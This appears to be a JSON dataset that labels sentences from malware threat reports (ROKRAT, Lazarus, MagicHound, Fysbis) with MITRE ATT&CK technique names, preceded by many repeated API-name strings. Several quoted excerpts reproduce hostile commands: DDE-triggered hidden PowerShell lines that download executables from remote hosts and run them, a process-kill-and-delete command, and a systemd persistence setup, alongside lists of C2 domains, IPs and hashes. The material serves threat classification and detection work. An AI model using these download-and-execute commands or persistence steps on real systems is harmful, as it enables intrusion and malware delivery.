    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " \nLoadPackagedLibrary() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " WinExec() ",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    " ShellExecute",
    "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001))."
  ],
  "modify registry registry run keys / startup folder query registry-multi": {
    "technique_names": [
      "modify registry",
      "boot or logon autostart execution: registry run keys / startup folder",
      "query registry"
    ],
    "sentances": [
      "Here is the registry creation:The registry location where persistence is achieved is: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update",
      "Deletion of all registry keys associated with the extraction of the SFX RAR Deletion of the User Assist Key entries related to applications that have been recently executed Deletion of all registry keys relating to services that have recently run  Clearly the attacker using this PlugX is paranoid about it being detected on disk, both in the registry and the file system"
    ]
  },
  "system information discovery remote file copy-multi": {
    "technique_names": [
      "system information discovery",
      "ingress tool transfer"
    ],
    "sentances": [
      "The file will be inflated in order to retrieve a RTF document, this document will be displayed to the infected user by executing Wordpad.Here is the PDB path from the PoohMilk sample:E:\\BIG_POOH\\Project\\milk\\Release\\milk.pdbFreenki SampleThe purpose of Freenki is to collect information on the infected system and to download a third executable"
    ]
  },
  "account discovery obfuscated files or information-multi": {
    "technique_names": ["account discovery", "obfuscated files or information"],
    "sentances": [
      "The malware uses obfuscation in order to hide strings such as URL or User-Agent, the algorithm is based on bitwise (SUB 0x0F XOR 0x21), here is the decoded data:hxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.phpMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; .NET4.0E; InfoPath.3)The downloaded third payload is obfuscated using the same technique"
    ]
  },
  "process injection: process hollowing": [
    "Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs",
    "Unpacks the code in memory via process hollowing",
    "It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable",
    "Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process",
    "Figure 6 Example of delivery document The RTF document (8cf3bc2bf\u2026) was very small in size at 264 bytes, which can be seen in its entirety here:       {\\rtf1{\\field{\\*\\fldinst DDEAUTO \"C:\\\\\\\\WIndowS\\\\\\\\SYsTem32\\\\\\\\cMD.eXe \" \"/C\tPOWErsHELl.eXE\u00a0\u00a0-ex\u00a0\u00a0\u00a0\u00a0 BypaSs\u00a0\u00a0-NOP\t-w\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0HIdDen\u00a0\u00a0(NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'\u00a0\u00a0,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 '%apPDAtA%\\graph.exe'\u00a0\u00a0 )\u00a0\u00a0 ;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 saps\u00a0\u00a0\u00a0\u00a0'%Appdata%\\graph.exe'\"}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload",
    "Figure 1 Article referenced by decoy document in attack against British government agency \u00a0 The attached document leverages a DDE exploit to ultimately execute the following code:c:\\\\windows\\\\system32\\\\cmd.exe \"/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\\\AAA.exe');Start-Process('%TEMP%\\\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it",
    "Upon execution, this Trojan checks to see if it was configured with \u201cBINDERON\u201d to determine if it should extract an embedded payload from a resource named \u201cB\u201d, save it to %TEMP%\\%BIND1%, and create a new process with the embedded payload",
    "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "process injection command-line interface-multi": {
    "technique_names": [
      "process injection",
      "command and scripting interpreter"
    ],
    "sentances": [
      "The following graph view from IDA shows these steps.These execution steps allow the launch of the new ROKRAT variant by decoding the PE binary and injecting into the cmd.exe process"
    ]
  },
  "dll search order hijacking dll side-loading-multi": {
    "technique_names": [
      "hijack execution flow: dll search order hijacking",
      "hijack execution flow: dll side-loading"
    ],
    "sentances": [
      "This is performed by checking if the following libraries are loaded on the victim machine.SbieDll.dll (sandboxie library)Dbghelp.dll (Microsoft debugging tools)Api_log.dll (threatAnalyzer / GFI SandBox)Dir_watch.dll (threatAnalyzer / GFI SandBox)We were able to uncover some other techniques used by this variant of ROKRAT to make analysis difficult, Group 123 used an anti-debugging technique related to NOP (No Operation).nop dword ptr [eax+eax+00h] is a 5 byte NOP"
    ]
  },
  "fallback channels system time discovery-multi": {
    "technique_names": ["fallback channels", "system time discovery"],
    "sentances": [
      "The source code only considers the following machine types:default:   lpString = \"(Other)\";               break;case 0x02: lpString = \"(Unknown)\";             break;case 0x03: lpString = \"(Desktop)\";             break;case 0x04: lpString = \"(Low Profile Desktop)\"; break;case 0x06: lpString = \"(Mini Tower)\";          break;case 0x07: lpString = \"(Tower)\";               break;case 0x08: lpString = \"(Portable)\";            break;case 0x09: lpString = \"(Laptop)\";              break;case 0x0A: lpString = \"(Notebook)\";            break;case 0x0E: lpString = \"(Sub Notebook)\";        break;The string format - with the () - and the considering types are exactly the same as those used in the ROKRAT samples.It's interesting to note that this reconnaissance phase was not included in the ROKRAT variant used during the \"Golden Time\" campaign.Brower StealerFor the first time, the ROKRAT sample used during the \"North Korean Human Rights\" contained a browser credentials stealer"
    ]
  },
  "spearphishing link clipboard data binary padding data encrypted-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "clipboard data",
      "obfuscated files or information: binary padding",
      "data encrypted for impact"
    ],
    "sentances": [
      "We also believe their target profile may change but for now it will mostly focus on Korean peninsula targets, however, as explained their capabilities will likely continue to evolve over time as they further refine their TTPs.IOCs\"Golden Time\" Campaign:Maldoc #1 sha256: 7d163e36f47ec56c9fe08d758a0770f1778fa30af68f39aac80441a3f037761eMaldoc #2 sha256: 5441f45df22af63498c63a49aae82065086964f9067cfa75987951831017bd4fROKRAT #1: cd166565ce09ef410c5bba40bad0b49441af6cfb48772e7e4a9de3d646b4851cROKRAT #1: 051463a14767c6477b6dacd639f30a8a5b9e126ff31532b58fc29c8364604d00Network:Malicious URLs:- hxxp://discgolfglow[.]com/wp-content/plugins/maintenance/images/worker.jpg- hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpgSafe URLs:- hxxps://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg- hxxp://www[.]hulu[.]com/watch/559035/episode3.mp4\"Evil New Year\" Campaign:Maldoc sha256: 281828d6f5bd377f91c6283c34896d0483b08ac2167d34e981fbea871893c919Dropped #1: 95192de1f3239d5c0a7075627cf9845c91fd397796383185f61dde893989c08aDropped #2: 7ebc9a1fd93525fc42277efbccecf5a0470a0affbc4cf6c3934933c4c1959eb1Dropped #3: 6c372f29615ce8ae2cdf257e9f2617870c74b321651e9219ea16847467f51c9fDropped #4: 19e4c45c0cd992564532b89a4dc1f35c769133167dc20e40b2a41fccb881277bDropped #5: 3a0fc4cc145eafe20129e9c53aac424e429597a58682605128b3656c3ab0a409Dropped #6: 7d8008028488edd26e665a3d4f70576cc02c237fffe5b8493842def528d6a1d8Unpacked #1: 7e810cb159fab5baccee7e72708d97433d92ef6d3ef7d8b6926c2df481ccac2fUnpacked #1: 21b098d721ea88bf237c08cdb5c619aa435046d9143bd4a2c4ec463dcf275cbeUnpacked #1: 761454dafba7e191587735c0dc5c6c8ab5b1fb87a0fa44bd046e8495a27850c7Unpacked #1: 3d442c4457cf921b7a335c0d7276bea9472976dc31af94ea0e604e466596b4e8Unpacked #1: 930fce7272ede29833abbfb5df4e32eee9f15443542434d7a8363f7a7b2d1f00Unpacked #1: 4b20883386665bd205ac50f34f7b6293747fd720d602e2bb3c270837a21291b4Unpacked #1: f080f019073654acbe6b7ab735d3fd21f8942352895890d7e8b27fa488887d08Network:- www[.]imuz[.]com/admin/data/bbs/review2/board/index.php- www[.]imuz[.]com/admin/data/bbs/review2/board/123.php- www[.]imuz[.]com/admin/data/bbs/review2/board/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)- www[.]wildrush[.]co[.]kr/bbs/data/image/work/webproxy.php- www[.]wildrush[.]co[.]kr/bbs/data/image/work/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)- www[.]belasting-telefoon[.]nl//images/banners/temp/index.php- www[.]belasting-telefoon[.]nl//images/banners/temp/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)- www[.]kgls[.]or[.]kr/news2/news_dir/index.php- www[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)\"Are You Happy?\" Campaign:Wiper sha256: 6332c97c76d2da7101ad05f501dc1188ac22ce29e91dab6d0c034c4a90b615bd\"FreeMilk\" Campaign:Office sha256: f1419cde4dd4e1785d6ec6d33afb413e938f6aece2e8d55cf6328a9d2ac3c2d0HTA sha256: a585849d02c94e93022c5257b162f74c0cdf6144ad82dd7cf7ac700cbfedd84fJS sha256: 1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3cPoohMilk sha256: 35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2Freenki sha256: 7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54dfFreenki 2016: 99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5Network:- hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]- hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg- hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg- hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp- hxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.php\"North Korean Human Rights\" Campaign:Maldoc sha256: 171e26822421f7ed2e34cc092eaeba8a504b5d576c7fd54aa6975c2e2db0f824Dropper #1: a29b07a6fe5d7ce3147dd7ef1d7d18df16e347f37282c43139d53cce25ae7037Dropper #2: eb6d25e08b2b32a736b57f8df22db6d03dc82f16da554f4e8bb67120eacb1d14Dropper #3: 9b383ebc1c592d5556fec9d513223d4f99a5061591671db560faf742dd68493fROKRAT:: b3de3f9309b2f320738772353eb724a0782a1fc2c912483c036c303389307e2e\"Evil New Year 2018\" Campaign:Maldoc sha256: f068196d2c492b49e4aae4312c140e9a6c8c61a33f61ea35d74f4a26ef263eadPNG : bdd48dbed10f74f234ed38908756b5c3ae3c79d014ecf991e31b36d957d9c950ROKRAT:: 3f7827bf26150ec26c61d8dbf43cdb8824e320298e7b362d79d7225ab3d655b1Network:- hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngReferenceshttp://blog.talosintelligence.com/2017/02/korean-maldoc.htmlhttp://blog.talosintelligence.com/2017/04/introducing-rokrat.htmlhttp://blog.talosintelligence.com/2017/11/ROKRAT-Reloaded.html"
    ]
  },
  "screen capture audio capture-multi": {
    "technique_names": ["screen capture", "audio capture"],
    "sentances": [
      "Apart for its backdoor routines, this malware can steal information through keylogging, audio recording, and screen capture",
      "Takes screenshots when recording VoiceIP app audio",
      "Screen capture and audio recording\u00a0 SpyNote RAT was able to take screen captures and, using the device\u2019s microphone, listen to audio conversations"
    ]
  },
  "process injection dll search order hijacking rundll32 dll side-loading-multi": {
    "technique_names": [
      "process injection",
      "hijack execution flow: dll search order hijacking",
      "system binary proxy execution: rundll32",
      "hijack execution flow: dll side-loading"
    ],
    "sentances": [
      "Our analysis of the backdoors used in the September 2018 attacks show that AuditCred.dll/ROptimizer.dll was similarly used:    \u00a0 FileTokenBroker.dll\u00a0 (2017 attack) AuditCred.dll/Roptimizer.dll\u00a0 (2018 attack)   Launch Method Service Service   Function Loader Component Loader Component   Working directory %Windows%\\System32 %Windows%\\System32   Loaded Component Path %Windows%\\System32\\en-US %Program Files%\\Common Files\\System\\ado   Loaded Component Blending Blends with .mui files Blend with ActiveX data Object dll files    Table1: Similarities of the Loader components in both incidents Analysis of backdoors used in 2018 The Lazarus group used a series of backdoors in their 2018 attacks, employing a complicated technique that involves three major components:  AuditCred.dll/ROptimizer.dll (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) \u2013 loader DLL that is launched as a service Msadoz<n>.dll (detected by Trend Micro as BKDR64_BINLODR.ZNFJ-A) \u2013 encrypted backdoor n = number of characters in the loader dll\u2019s filename Auditcred.dll.mui/rOptimizer.dll.mui (detected by Trend Micro as TROJ_BINLODRCONF.ZNFJ-A) \u2013 encrypted configuration file   Figure 1: Loading sequence of the modularized backdoor The loader DLL is installed as a service and uses different names (AuditCred and ROptimizer) on different machines",
      "41 42 43 44 46 47 48 49 50 51 52 53 56 isys9core_64.dll isyspdf6_64.dll isyspdfl_64.dll isysdc_64.dll isys9.key isys.cwd isys.elx isys9_32.dll isys9core_32.dll isyspdf6_32.dll isyspdfl_32.dll isysdc_32.dll isys9_64.dll Proprietary \u201cISYS Search Software\u201d components are used by Indexer plugin",
      "These dropped files bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory: C:\\Documents and Settings\\user\\Application Data\\ATI_Subsystem\\ 6761106f816313394a653db5172dc487,amdhcp32.dll,54kb \u00a0\u2190 32bit dll,CompiledOn:2014.07.02 21:13:24 d596827d48a3ff836545b3a999f2c3e3,aticaldd.dll,60kb \u00a0\u2190 64bit dll,CompiledOn:2014.07.02 21:13:26 bc626c8f11ed753f33ad1c0fe848d898,atiumdag.dll,285kb \u2190 32bit dll, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26 4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat The code copies rundll32.exe from windows\\system32 to its newly created %appdata%\\ATI_Subsystem subdirectory as \u201camdocl_as32.exe\u201d alongside the three dll\u2019s listed above"
    ]
  },
  "security software discovery file deletion-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "indicator removal on host: file deletion"
    ],
    "sentances": [
      "The backdoors they are deploying are difficult to detect and a significant threat to the privacy and security of enterprises, allowing attackers to steal information, delete files, install malware, and more"
    ]
  },
  "system service discovery new service remote services web service service execution-multi": {
    "technique_names": [
      "system service discovery",
      "create or modify system process",
      "remote services",
      "web service",
      "system services: service execution"
    ],
    "sentances": [
      "Creates the service file /usr/lib/systemd/system/rsyncd.service [Unit]Description= synchronize and backup service.After=syslog.target [Service].ExecStart=/bin/rsyncd.OOMScoreAdjust=-500 [Install].WantedBy=multi-user.target Then it installs the service by executing the following commands: ln -s '/lib/systemd/system/rsyncd.service' '/etc/systemd/system/multi-user.target.wants /rsyncd.service' systemctl daemon-reload  The running systemd process determines, which option will be used to register the Trojan in autorun"
    ]
  },
  "data from local system deobfuscate/decode files or information software packing exfiltration over command and control channel data compressed data encrypted-multi": {
    "technique_names": [
      "data from local system",
      "deobfuscate/decode files or information",
      "obfuscated files or information: software packing",
      "exfiltration over c2 channel",
      "archive collected data",
      "data encrypted for impact"
    ],
    "sentances": [
      "The configuration data used by the backdoor has the following structure: #pragma pack(push, 1) struct st_cncconfig {   _WORD id;   _BYTE byte2;   _BYTE byte3;   _QWORD pCnCBeg;   _QWORD pCnCEnd;   _QWORD pLastElement; }; #pragma pack(pop) To be able to enter the data into the database, Linux.BackDoor.Fysbis.1 converts the configuration data into the following structure: #pragma pack(push, 1) struct st_crypted_config_data {   _WORD id;   _BYTE byte2;   _BYTE byte3;   char* pCnC;  }; #pragma pack(pop) Before the configuration data is encrypted with the RC4 algorithm, 11 signature bytes are added to the end of the data (11 bytes are stored in the backdoor's body)"
    ]
  },
  "timestomp deobfuscate/decode files or information command-line interface-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "deobfuscate/decode files or information",
      "command and scripting interpreter"
    ],
    "sentances": [
      "The main module of the Trojan can execute the following commands:  CommandDescription 0x1FSet the dwell time value for the standby mode 0x29Activate the controllers 0x2ASet new configuration data and update the list of command and control servers 0x32Set the dwell time value for the active mode 0x33Set up the plug-in 0x33Save the dwell time values into the database 0x34Activate the plug-ins 0x35Add configuration data 0x36Delete the specified configuration data  The Remote Shell Module can execute the following commands:  CommandDescription 0x66Exit 0x65Open a remote Shell 0x68Verify that the Shell in running 0x67Execute a command  The module, which interacts with the file system, can execute the following commands:  cmdDescription 0x65Find the file(s) 0x66Read the file(s) 0x67Save the file 0x68Remove the file(s) 0x69Run the file(s)  A report on the operations\u2019 execution by this module is displayed as the HTML code"
    ]
  },
  "process injection dll side-loading-multi": {
    "technique_names": [
      "process injection",
      "hijack execution flow: dll side-loading"
    ],
    "sentances": [
      "Different colors show the three dropped modules: legit app (blue), launcher (green), and decompressor with the Trojan embedded (red) The initial module drops three files that are typical for Chinese-speaking actors: a legit Symantec pcAnywhere (IntgStat.exe) for DLL side loading, a .dll launcher (pcalocalresloader.dll) and the last-stage decompressor (thumb.db)",
      "The malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll using: cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL All the following capabilities described are implemented by the malicious service DLL implant unless specified.\u00a0\u00a0 Variant using North Korean Red Cross Another variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same Base64-decoding scheme with a different custom key",
      "25 26 ix32.dll ix64.dll LoadLibrary call template dll is used by Reinstaller/Injector plugin (rsXX.dll) for injecting LoadLibrary call into running processes",
      "37 38 zlib64.dll zlib32.dll Open source \u201czlib\u201d version 1.2.3 used by libpngXX.dll for compressing screenshots (ssXX.dll)"
    ]
  },
  "masquerading web service-multi": {
    "technique_names": ["masquerading", "web service"],
    "sentances": [
      "The weaponized Office documents were found to be hosted either on what appeared to be compromised legitimate websites, or on websites using domain names similar to legitimate domain names in appearance"
    ]
  },
  "command-line interface powershell-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "The loader\u2019s main goal was to run a PowerShell command to execute shellcode",
      "The \u201cExcel\u201d command receives another stage of the PowerShell code, saves it in \u201cc:\\programdata\\a.ps1\u201d and then asks Excel to execute this PowerShell script via DDE"
    ]
  },
  "standard application layer protocol scripting powershell-multi": {
    "technique_names": [
      "application layer protocol",
      "command and scripting interpreter",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "The shellcode executed by this PowerShell is the exact same as in the delivery documents, using code from Metasploit which can obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We were not able to retrieve the shellcode hosted at this URL"
    ]
  },
  "standard application layer protocol custom cryptographic protocol web service exfiltration over command and control channel credentials in files uncommonly used port fallback channels system time discovery-multi": {
    "technique_names": [
      "application layer protocol",
      "encrypted channel",
      "web service",
      "exfiltration over c2 channel",
      "unsecured credentials: credentials in files",
      "non-standard port",
      "fallback channels",
      "system time discovery",
      "non-standard port"
    ],
    "sentances": [
      "Palo Alto Networks customers are protected via the following:  WildFire identification and detection of malicious samples Command and control servers are classified as malicious AutoFocus tags have been created  Magic Hound MagicHound DropIt MagicHound Fetch MagicHound Retriever MagicHound Rollover MagicHound Leash MagicHound MPKBot PuPYRAT    INDICATORS OF COMPROMISE MagicHound.DropIt SHA256 c21074f340665935e6afe2a972c8d1ab517954e2dd05cc73e5ff0e8df587b99d ea139a73f8ec75ea60dfa87027c7c3ef4ed61b45e1acb5d1650cc54e658984ba da2abdc951e4b2272fea5c8989debd22e26350bab4b4219104bccec5b8a7ff5a 0d3ae682868cb3ff069ec52e1ffc5ef765453fd78e47b6366d96aebb09afd8ab f0ecc4388f0d84501499711681a64a74c5d95e0bb6a2174cbe3744bd5a456396 860f4cd44371a180a99bc16526f54f8b051c420a3df334d05d569d0cdadac3d2 b42b1186211633c2d47f3d815f0371ba234fee2ed0f26e487badc58e1ab81061 4beee6e7aa244335e161fdc05296ea100090c2114b4ff2e782e3ee3e1f936fdf 5e0e09c9860b293c4c9a2382a7392963adc54d6a23440abb9a2d89c50f8fd305 3161f9087d89a2d036ea32741d5a006c6bb279d36ff8d1acde63f2e354f8c502 \u00a0 MagicHound.Fetch PE SHA256 b6c159cad5a867895fd41c103455cebd361fc32d047b573321280b1451bf151c 6a7537f2cedbf453114cfba086e4746e698713777fb4fa4fc8964247dde741ed 16d87fbd8667677da1af5433b6d797438f8dc0ab565fb40ecb29f83f148888cd 92bc7d04445cf67aa7ddf15792cd62778d2d774d06616d1986f4c389b3d463f5 86d3409c908f667dd298b6a7e1e17652bb29af73e7daed4a5e945fbdf742e9f4 c3a8f5176351e87d28f45e58c79bb6646bb5d94ade7a24c6556514c860004143 a390365ddfcce146a8fa8435022f19b9a1be29f2b11a049cb660ec53f36beb06 d2ffc757a12817e4b58b3d58d71da951b177dedd3f65ca41fad04a03fc63fac6 79c9894b50cde62b182bd1560060c5c2bf5a1cef2b8afdffc4766e8c55ff6932 2f7f3582504fbce349a6991fbb3b5f9577c5c014b6ce889b80d51977fa6fb31a 8c2e4aa8d73ad2e48d70dfa18abea62769c7bef59c8c1607720f4f6162413f75 abe8e86b787998a07411ee24f3f3d8a79e37c6da539650ceed566b081f968c26 9e4d2e983f8a807f741f8873e6fa5d222dc6f3b358ccfc3a6c700398b342f656 e57f77cc3d117923ec01aa0e044edc11b1042e57993ca7f74d971630893ca263 ca6e823dedd6ca5fada2b1fa63d0acb288027f5a3cdd2c60dcace3c424c5ced0 eaaecabb439c81e522d9f5681fdb047ee62381e763f0d9646e68cd507479ba5a 1c3e527e496c4b0594a403d6d582bc6db3029d27369720d0d5122f862b10d8f1 29a659fb0ef0262e4de0dc3c6a140677b6ddee13c1819b791bd280be0547e309 \u00a0 MagicHound.Fetch PE C2 service.chrome-up[.]date www3.chrome-up[.]date www7.chrome-up[.]date timezone[.]live service1.chrome-up[.]date 104.238.184[.]252 www5.chrome-up[.]date servicesystem.serveirc[.]com \u00a0 MagicHound.Fetch DOC SHA256 218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2 e5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6 71e584e7e1fb3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087 388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ff21d2073c56ea565d 33ee8a57e142e752a9c8960c4f38b5d3ff82bf17ec060e4114f5b15d22aa902e 5469facc266d5582bd387d69032a91c8fff373213b66a2f0852666e72bcdc1da 528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62 66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b cfce4827106c79a81eef6d3a0618c90bf5f15936036873573db76bed7e8a0864 68db2b363a88b061cc9063535f3920673f1f08d985b14cb52b898ced6c0f8964 e837f6b814c09900726dac2cf55f41babf361152875ba2a765a34ee5cc496087 f912d40de9fe9a726448c1d84dfba2d4941f57210b2dbc035f5d34d68e8ac143 af0ae0fa877f921d198239b7c722e12d14b2aa32fdfadaa37b47f558ae366de9 6d1a50ca3e80442fa3e2caca86c166ed60bef32c2d0af7352cd227303cdec031 \u00a0 MagicHound.Fetch DOC C2 45.76.128[.]165 139.59.46[.]154 104.218.120[.]128 89.107.62[.]39 69.87.223[.]26 analytics-google[.]org 89.107.60[.]11 www3.chrome-up[.]date www.microsoftsubsystem.com-adm[.]in www1.chrome-up[.]date \u00a0 MagicHound.Fetch XLS SHA256 6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b 97943739ccf8a00036dd3cdd0ba48e17a82ab9b65cc22c17c6e6258e72bb9ade \u00a0 MagicHound.Fetch XLS C2 45.76.128[.]165 139.59.46[.]154 \u00a0 Pupy Loaders SHA256 7e57e35f8fce0efc3b944a7545736fa419e9888514fcd9e098c883b8d85e7e73 db453b8de1a01a3e4d963847c0a0a45fb7e1a9b9e6d291c8883c74019f2fc91f 82779504d3fa0ffc8506ab69de9cb4d8f6415adbb11a9b8312828c539cf10190 \u00a0 Pupy Loaders C2 139.59.46[.]154 www1.chrome-up[.]date \u00a0 MagicHound.Retriever SHA256 1c550dc73b7a39b0cd21d3de7e6c26ece156253ac96f032efc0e7fcc6bc872ce 7cdbf5c035a64cb6c7ee8c204ad42b4a507b1fde5e6708ea2486942d0d358823 